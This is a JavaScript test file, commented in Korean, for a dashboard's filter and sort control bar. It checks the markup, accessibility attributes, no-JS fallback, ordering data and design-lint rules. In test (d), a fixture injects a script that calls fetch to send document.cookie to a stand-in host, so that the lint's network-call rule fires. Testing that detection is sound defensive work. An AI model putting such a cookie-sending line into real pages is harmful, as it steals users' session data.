'use strict';

// Dashboard Data Exploration M2 — 필터/정렬 컨트롤 바(panel-header 통합) 렌더 회귀.
// (a) .explore-bar 마크업 + data-* 속성 + aria + .js-only + panel-head 통합
// (b) 위험·질문 패널 head 에 각 1개(scope=route) + 사이드바 바 부재 + per-route 옵션
// (c) no-JS degrade(script 제거 후 전체 항목 가시)
// (d) H16/H19 design-lint clean(sentinel value carve-out + inline script network 0)
// (e) F1 chronology≠severity(data-ord 순서 ≠ severity 렌더 순서)
// (f) F2 flat 섹션(.prd-group 부재)도 explore <script> emit + .explore-bar reveal

const test = require('node:test');
const assert = require('node:assert/strict');
const { renderStatus } = require('../index');
const { runOutputConstraints } = require('../output-constraints');

// 2 PRD × (위험·질문) 모델. risk 표는 parse 순(첫 행)으로 쌓이므로 LOW→HIGH 순서를
// 줘서 F1(chronology≠severity)을 함께 검증한다(group a 의 위험 2건).
function multiModel() {
  return {
    derived_at: new Date(0).toISOString(),
    masked: true,
    m0_capability: { contract_present: true },
    warnings: [],
    sources: {
      plans: {
        items: [
          { path: '.claude/plans/p1.plan.md', source_prd: '.claude/prds/prd1.prd.md' },
          { path: '.claude/plans/p2.plan.md', source_prd: '.claude/prds/prd2.prd.md' },
        ],
      },
      receipts: { items: [] },
      state: { item: { body: { open_questions: ['전역 질문 G'] } } },
      backlog: { count: 0, items: [] },
      fix_task: { item: null },
      pr: { item: null },
      envelopes: { count: 0, items: [] },
    },
    correlations: [],
  };
}
const PRD1 = '# 데이터 탐색 PRD\n\n## Delivery Milestones\n\n| # | M | O | Status | Plan |\n'
  + '|---|---|---|---|---|\n| 1 | M1 | x | in-progress | [p1](.claude/plans/p1.plan.md) |\n';
const PRD2 = '# 멀티세션 PRD\n\n## Delivery Milestones\n\n| # | M | O | Status | Plan |\n'
  + '|---|---|---|---|---|\n| 1 | M1 | x | in-progress | [p2](.claude/plans/p2.plan.md) |\n';
// p1 — 위험 2건: 첫 행(parse 순 0) LOW, 둘째(1) HIGH → severity 정렬 시 역전.
const PLAN1 = '# p1\n\n## Open Questions\n\n- 질문 A1 (HIGH)\n\n## Risks\n\n'
  + '| Risk | Likelihood | Impact | Mitigation |\n|---|---|---|---|\n'
  + '| 낮은위험 P1 | Low | Low | m |\n| 높은위험 P1 | High | High | m |\n';
const PLAN2 = '# p2\n\n## Open Questions\n\n- 질문 B1 (HIGH)\n\n## Risks\n\n'
  + '| Risk | Likelihood | Impact | Mitigation |\n|---|---|---|---|\n| 위험 B1 | High | High | m |\n';
function multiRead(p) {
  const s = String(p).replace(/\\/g, '/');
  if (s.endsWith('prd1.prd.md')) return PRD1;
  if (s.endsWith('prd2.prd.md')) return PRD2;
  if (s.endsWith('p1.plan.md')) return PLAN1;
  if (s.endsWith('p2.plan.md')) return PLAN2;
  throw new Error('ENOENT ' + p);
}
function renderMulti() {
  return renderStatus(multiModel(), { cwd: '/repo', fsRead: multiRead, snapshotsDir: null });
}
// route 세그먼트(다음 route id 직전까지) 추출 — 어느 바가 어느 route 안에 있는지 검증용.
function routeSeg(html, id, nextId) {
  const start = html.indexOf('id="' + id + '"');
  if (start < 0) return '';
  const endRaw = nextId ? html.indexOf('id="' + nextId + '"') : -1;
  return html.slice(start, endRaw < 0 ? html.length : endRaw);
}

// ── (a) 마크업 + data-* + aria + panel-head 통합 ───────────────────────────

test('(a) 위험·질문 패널 head 에 .explore-bar(js-only) + select/aria/live-region', () => {
  const r = renderMulti();
  assert.ok(r.html.includes('class="explore-bar js-only"'), '.explore-bar js-only 존재');
  assert.ok(r.html.includes('data-explore-scope="route"'), 'route scope 마커');
  assert.ok(!r.html.includes('data-explore-scope="global"'), 'global 사이드바 배치 폐기');
  assert.ok(r.html.includes('aria-label="PRD 필터"'), 'PRD select aria-label');
  assert.ok(r.html.includes('aria-label="plan 필터"'), 'plan select aria-label');
  assert.ok(r.html.includes('aria-label="정렬"'), '정렬 select aria-label');
  assert.ok(/<span class="explore-count sr-only" role="status" aria-live="polite">/.test(r.html), '결과 수 sr-only live-region');
  assert.ok(r.html.includes('class="explore-reset"'), '초기화 버튼');
  assert.ok(r.html.includes('>위험도순<') && r.html.includes('>시간순<'), '정렬 옵션 2종');
});

test('(a) panel-head 통합 — .explore-bar 가 panel-head-tools 안에 우측 배치', () => {
  const r = renderMulti();
  // head 클래스에 panel-head-tools 부여 + 같은 head 안에 .explore-bar 가 인접.
  assert.ok(/class="panel-head panel-head-tools"[\s\S]{0,500}?class="explore-bar js-only"/.test(r.html),
    'explore-bar 가 panel-head-tools head 안에 통합');
});

test('(a) 컨트롤 형태 — 필터군 .ex-filters + 정렬 분리 + 초기화 항상표시 + count sr-only 바 밖', () => {
  const r = renderMulti();
  // 필터(PRD·plan)는 .ex-filters 로 묶이고 그 안에 두 select.
  assert.ok(/<div class="ex-filters">[\s\S]*?data-axis="prd"[\s\S]*?data-axis="plan"[\s\S]*?<\/div>/.test(r.html),
    'PRD·plan 이 .ex-filters 그룹 안에');
  // 정렬은 ex-filters 밖(필터군과 분리) + ex-sort.
  assert.ok(r.html.includes('ex-select ex-sort'), '정렬 select 는 ex-sort');
  // 초기화는 항상 노출(현대 필터 UI 필수 — hidden 아님).
  assert.ok(/<button type="button" class="explore-reset">초기화<\/button>/.test(r.html), '초기화 항상 표시');
  assert.ok(!/class="explore-reset" hidden/.test(r.html), '초기화에 hidden 없음');
  // 결과 수 span 은 .explore-bar(선택~초기화) 컨트롤 cluster 안에 없음.
  assert.ok(!/class="explore-count/.test(r.html.match(/<div class="explore-bar js-only"[^]*?<\/button>/)[0]),
    'explore-count 는 컨트롤 cluster 안에 없음');
  // panel-head 안엔 .sr-only live-region 으로 존재(스크린리더용, 시각 숨김).
  assert.ok(/class="panel-head panel-head-tools">[\s\S]*?class="explore-count sr-only" role="status" aria-live="polite"/.test(r.html),
    'explore-count 는 panel-head 안 sr-only live-region');
});

test('(a) li-item 에 data-plan·data-sev·data-ord 부여(data-prd 위에 누적)', () => {
  const r = renderMulti();
  const li = (r.html.match(/<li class="li-item"[^>]*>/g) || [])[0] || '';
  assert.ok(/data-prd="/.test(li), 'data-prd');
  assert.ok(/data-plan="/.test(li), 'data-plan');
  assert.ok(/data-sev="\d"/.test(li), 'data-sev 수치');
  assert.ok(/data-ord="\d+"/.test(li), 'data-ord 수치');
});

// ── (b) per-route 통합 + 사이드바 청정 ─────────────────────────────────────

test('(b) 위험·질문 각 패널 head 에 바 1개씩(총 2) + 사이드바 바 부재', () => {
  const r = renderMulti();
  const bars = (r.html.match(/class="explore-bar js-only"/g) || []).length;
  assert.equal(bars, 2, '위험 + 질문 = 2 바(scope=route)');
  // 사이드바(스위처 ~ main-col 직전) 영역엔 필터 바 없음 — nav 무게감 0 + 탭순서 청정.
  const sidebar = r.html.slice(r.html.indexOf('class="sidebar"'), r.html.indexOf('class="main-col"'));
  assert.ok(sidebar.length > 0 && !sidebar.includes('explore-bar'), '사이드바엔 필터 바 부재');
});

test('(b) 위험 바는 위험 route, 질문 바는 질문 route 안(scope=배치 일치)', () => {
  const r = renderMulti();
  const risks = routeSeg(r.html, 'route-risks', 'route-questions');
  const questions = routeSeg(r.html, 'route-questions', 'route-activity');
  assert.ok(risks.includes('class="explore-bar js-only"'), '위험 route 안에 바');
  assert.ok(questions.includes('class="explore-bar js-only"'), '질문 route 안에 바');
  // 각 route 안의 바는 1개씩(중복 emit 0).
  assert.equal((risks.match(/class="explore-bar js-only"/g) || []).length, 1, '위험 route 바 1개');
  assert.equal((questions.match(/class="explore-bar js-only"/g) || []).length, 1, '질문 route 바 1개');
});

// ── (c) no-JS degrade ──────────────────────────────────────────────────────

test('(c) no-JS degrade — script 제거 후 전체 항목 가시(.js-only 숨김, 항목 손실 0)', () => {
  const r = renderMulti();
  const noScript = r.html.replace(/<script[\s\S]*?<\/script>/gi, '');
  for (const t of ['낮은위험 P1', '높은위험 P1', '위험 B1', '질문 A1', '질문 B1', '전역 질문 G']) {
    assert.ok(noScript.includes(t), 'JS 제거 후 항목 손실: ' + t);
  }
  // STATUS.md 평문에도 전체 항목(필터/정렬은 HTML 전용).
  for (const t of ['낮은위험 P1', '높은위험 P1', '위험 B1']) {
    assert.ok(r.md.includes(t), 'md 항목 누락: ' + t);
  }
});

// ── (d) design-lint clean ──────────────────────────────────────────────────

test('(d) H16/H19 clean — sentinel value carve-out + inline script network primitive 0', () => {
  const r = renderMulti();
  assert.deepEqual(r.design_constraint_violations, [],
    'violations: ' + JSON.stringify(r.design_constraint_violations));
});

test('(d) H19 — explore-sort.js + explore.js inline 본문 network primitive 0', () => {
  const r = renderMulti();
  // 두 스크립트가 inline emit 됐는지 + H19 clean.
  assert.ok(r.html.includes('window.__mccpExplore'), 'explore-sort.js inline emit(window.__mccpExplore)');
  const oc = runOutputConstraints({ css: r.css || '', html: r.html, md: r.md });
  assert.ok(!oc.violations.includes('H19'), 'inline 엔진 H19 clean');
  // drift fixture — fetch 주입 시 발화.
  const fire = runOutputConstraints({
    css: '', html: '<body><script>(function(){fetch("https://x.example/"+document.cookie)})()</script></body>', md: '',
  });
  assert.ok(fire.violations.includes('H19'), 'fetch 주입 시 H19 RED');
});

// ── (e) F1 chronology≠severity ─────────────────────────────────────────────

test('(e) F1 — data-ord 가 render(severity) 순서가 아닌 원본 parse chronology 인코딩', () => {
  const r = renderMulti();
  // group a(PRD1, 위험 2건)만 추출 — severity desc 는 그룹 *내*에서만 성립(그룹 경계 넘지 않음).
  const risksRoute = r.html.match(/id="route-risks"[\s\S]*?<\/section>/)[0];
  const firstGroup = (risksRoute.match(/<details class="prd-group"[\s\S]*?<\/details>/) || [])[0] || '';
  const lis = firstGroup.match(/<li class="li-item"[^>]*>/g) || [];
  assert.ok(lis.length >= 2, 'group a 에 위험 2건');
  const ords = lis.map((li) => Number((li.match(/data-ord="(\d+)"/) || [])[1]));
  const sevs = lis.map((li) => Number((li.match(/data-sev="(\d+)"/) || [])[1]));
  // 그룹 내 render 는 severity desc(높은위험 sev3 먼저, 낮은위험 sev1 나중).
  for (let i = 1; i < sevs.length; i++) assert.ok(sevs[i] <= sevs[i - 1], '그룹 내 severity desc');
  // 높은위험 parse 순(ord1)이 낮은위험(ord0)보다 *나중* 인데 severity 로 먼저 렌더됨 →
  // data-ord 가 [1,0] 비단조 = render/severity 순서를 인코딩하지 않음(chronology 보존, Codex F1).
  assert.deepEqual(ords, [1, 0],
    'data-ord 가 chronology(parse 순) 유지 — render(severity) 순서면 [0,1] 이어야 함: ' + ords.join(','));
});

// ── (f) F2 flat 섹션 ───────────────────────────────────────────────────────

// source_prd 없는 단일 plan → risk 가 단일 __unknown__/fallback 그룹(.prd-group 부재 flat).
function flatModel() {
  return {
    derived_at: new Date(0).toISOString(),
    masked: true,
    m0_capability: { contract_present: true },
    warnings: [],
    sources: {
      plans: { items: [{ path: '.claude/plans/solo.plan.md' }] }, // source_prd 없음
      receipts: { items: [] },
      state: { item: { body: { open_questions: [] } } },
      backlog: { count: 0, items: [] },
      fix_task: { item: null },
      pr: { item: null },
      envelopes: { count: 0, items: [] },
    },
    correlations: [],
  };
}
const SOLO = '# solo\n\n## Risks\n\n| Risk | Likelihood | Impact | Mitigation |\n|---|---|---|---|\n'
  + '| 위험 S1 | High | High | m |\n| 위험 S2 | Medium | Medium | m |\n';
function flatRead(p) {
  if (String(p).replace(/\\/g, '/').endsWith('solo.plan.md')) return SOLO;
  throw new Error('ENOENT ' + p);
}

test('(f) F2 — flat 섹션(.prd-group 부재)도 .explore-bar + explore <script> emit', () => {
  const r = renderStatus(flatModel(), { cwd: '/repo', fsRead: flatRead, snapshotsDir: null });
  const risksRoute = r.html.match(/id="route-risks"[\s\S]*?<\/section>/)[0];
  assert.ok(!risksRoute.includes('class="prd-group"'), '단일 fallback → .prd-group 부재(flat)');
  assert.ok(risksRoute.includes('class="explore-bar js-only"'), 'flat 이어도 .explore-bar emit');
  assert.ok((risksRoute.match(/class="li-item"/g) || []).length >= 2, 'flat <ul> 에 항목 2+');
  // emit gate(F2) — .prd-group 없어도 .explore-bar 있으면 엔진 스크립트 emit.
  assert.ok(r.html.includes('window.__mccpExplore'), 'F2: explore-sort.js emit');
  assert.deepEqual(r.design_constraint_violations, [], 'flat 산출물 design-lint clean');
});

// ── (g) 필터 시 첫 가시 그룹 stray hairline 보정 ────────────────────────────
// .prd-group:first-of-type 는 DOM 기준이라 필터로 첫 그룹이 숨겨지면 둘째(시각상 첫)
// 그룹에 border-top hairline 이 남는다. 엔진이 부모별 첫 가시 그룹에 ex-first-visible
// 을 부여해 보정. DOM 실행은 dep-free 라 정적 검증(CSS 규칙 + 엔진 클래스 wiring 존재).
test('(g) ex-first-visible — 첫 가시 그룹 border 제거 CSS 규칙 + 엔진 클래스 wiring', () => {
  const r = renderMulti();
  assert.ok(/\.prd-group\.ex-first-visible\s*\{\s*border-top:\s*0/.test(r.html),
    'ex-first-visible border-top:0 규칙(특정성 0,2,0 > .prd-group)');
  assert.ok(r.html.includes("classList.add('ex-first-visible')"), '엔진이 부모별 첫 가시 그룹에 부여');
  assert.ok(r.html.includes("classList.remove('ex-first-visible')"), '엔진이 매 apply 시 reset');
});
